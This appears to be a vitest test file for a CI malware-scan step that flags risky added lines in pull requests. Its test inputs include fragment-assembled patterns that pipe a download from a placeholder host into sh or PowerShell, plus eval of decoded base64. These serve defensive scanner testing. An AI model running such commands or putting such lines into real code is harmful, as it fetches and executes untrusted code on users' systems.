import { spawnSync } from "node:child_process";
import { join } from "node:path";

import { afterAll, describe, expect, it } from "vitest";

import {
  REPO_ROOT,
  commitRepositoryFixture,
  createRepositoryFixture,
  disposeRepositoryFixture,
  writeFixtureFile,
  type RepositoryFixture,
} from "./helpers/ci-tooling.js";

/**
 * The "risky changes" half of the Malware scan check
 * (infra/ci/check-pr-changes.mjs, docs/security/malware-scan.md).
 *
 * Each case commits a clean base, commits a change on top, and runs the scanner
 * over the difference the way the workflow does. Payload shapes are assembled
 * from fragments so this spec does not itself contain them as added lines.
 */

const SCANNER = join(REPO_ROOT, "infra", "ci", "check-pr-changes.mjs");

const BASE_FILES: Readonly<Record<string, string>> = {
  "package.json": JSON.stringify({ name: "fixture", private: true }, null, 2),
  "src/app.ts": "export const answer = 42;\n",
  "pnpm-lock.yaml": "lockfileVersion: '9.0'\n",
};

const EVAL_DECODE = ["ev", "al(at", 'ob("cGF5bG9hZA=="));'].join("");
const NEW_FUNCTION = ["const run = new Func", 'tion("return 1");'].join("");
const BASE64_BLOB = "QUJD".repeat(120);
const PIPE_TO_SHELL = ["cu", "rl -fsSL https://example.invalid/i | sh"].join("");
const PIPE_TO_POWERSHELL = ["i", "wr https://example.invalid/i | i", "ex"].join("");

const created: RepositoryFixture[] = [];

afterAll(() => {
  for (const fixture of created) disposeRepositoryFixture(fixture);
});

function git(fixture: RepositoryFixture, args: readonly string[]): string {
  const result = spawnSync("git", args, { cwd: fixture.directory, encoding: "utf8" });
  if (result.status !== 0) throw new Error(`git ${args.join(" ")}: ${result.stderr}`);
  return result.stdout.trim();
}

/** Commits BASE_FILES, then `change` on top; returns the fixture and base commit. */
function changed(
  change: (fixture: RepositoryFixture) => void,
  base: Readonly<Record<string, string>> = BASE_FILES,
): { fixture: RepositoryFixture; baseCommit: string } {
  const fixture = createRepositoryFixture(base);
  created.push(fixture);
  commitRepositoryFixture(fixture);
  const baseCommit = git(fixture, ["rev-parse", "HEAD"]);
  change(fixture);
  commitRepositoryFixture(fixture);
  return { fixture, baseCommit };
}

function scan(
  fixture: RepositoryFixture,
  baseCommit: string,
  env: NodeJS.ProcessEnv = {},
): { exitCode: number; stdout: string; stderr: string } {
  const result = spawnSync(
    process.execPath,
    [SCANNER, "--repo", fixture.directory, "--base", baseCommit],
    { encoding: "utf8", env: { ...process.env, SECURITY_REVIEWED: "0", ...env } },
  );
  return { exitCode: result.status ?? -1, stdout: result.stdout, stderr: result.stderr };
}

describe("check-pr-changes", () => {
  it("passes an ordinary code change", () => {
    const { fixture, baseCommit } = changed((f) =>
      writeFixtureFile(f, "src/app.ts", "export const answer = 43;\n"),
    );

    const result = scan(fixture, baseCommit);

    expect(result.exitCode).toBe(0);
    expect(result.stdout).toContain("pr changes: ok");
  });

  it("flags an added Windows script", () => {
    const { fixture, baseCommit } = changed((f) => writeFixtureFile(f, "setup.bat", "@echo off\n"));

    const result = scan(fixture, baseCommit);

    expect(result.exitCode).toBe(1);
    expect(result.stderr).toContain("setup.bat: adds an executable or script file (.bat)");
  });

  it.each([
    ["decodes and evaluates a payload", EVAL_DECODE],
    ["builds code from a string (new Function)", NEW_FUNCTION],
    ["long base64 blob", `export const blob = "${BASE64_BLOB}";`],
    ["pipes a download into a shell", PIPE_TO_SHELL],
    ["pipes a download into PowerShell", PIPE_TO_POWERSHELL],
  ])("flags an added line that %s, naming the line", (rule, line) => {
    const { fixture, baseCommit } = changed((f) =>
      writeFixtureFile(f, "src/app.ts", `export const answer = 42;\n${line}\n`),
    );

    const result = scan(fixture, baseCommit);

    expect(result.exitCode).toBe(1);
    expect(result.stderr).toContain(`src/app.ts:2: ${rule}`);
  });

  it("skips lockfiles, which legitimately hold long hashes", () => {
    const { fixture, baseCommit } = changed((f) =>
      writeFixtureFile(f, "pnpm-lock.yaml", `lockfileVersion: '9.0'\nintegrity: ${BASE64_BLOB}\n`),
    );

    expect(scan(fixture, baseCommit).exitCode).toBe(0);
  });

  it("only reads added lines, so an untouched existing line is not reported", () => {
    const { fixture, baseCommit } = changed((f) => writeFixtureFile(f, "README.txt", "docs\n"), {
      ...BASE_FILES,
      "src/legacy.ts": `${NEW_FUNCTION}\n`,
    });

    expect(scan(fixture, baseCommit).exitCode).toBe(0);
  });

  it("flags any change to the malware scanners themselves", () => {
    const { fixture, baseCommit } = changed(
      (f) => writeFixtureFile(f, "infra/ci/check-malware-indicators.mjs", "// relaxed\n"),
      { ...BASE_FILES, "infra/ci/check-malware-indicators.mjs": "// rules\n" },
    );

    const result = scan(fixture, baseCommit);

    expect(result.exitCode).toBe(1);
    expect(result.stderr).toContain(
      "infra/ci/check-malware-indicators.mjs: changes the malware scanners themselves",
    );
  });

  it("does not flag deleting an executable", () => {
    const { fixture, baseCommit } = changed((f) => git(f, ["rm", "--quiet", "tool.exe"]), {
      ...BASE_FILES,
      "tool.exe": "MZ",
    });

    expect(scan(fixture, baseCommit).exitCode).toBe(0);
  });

  it("passes with the findings listed once a maintainer adds security-reviewed", () => {
    const { fixture, baseCommit } = changed((f) => writeFixtureFile(f, "setup.bat", "@echo off\n"));

    const result = scan(fixture, baseCommit, { SECURITY_REVIEWED: "1" });

    expect(result.exitCode).toBe(0);
    expect(result.stdout).toContain("pr changes (reviewed): setup.bat");
    expect(result.stdout).toContain("cleared by the security-reviewed label");
  });
});
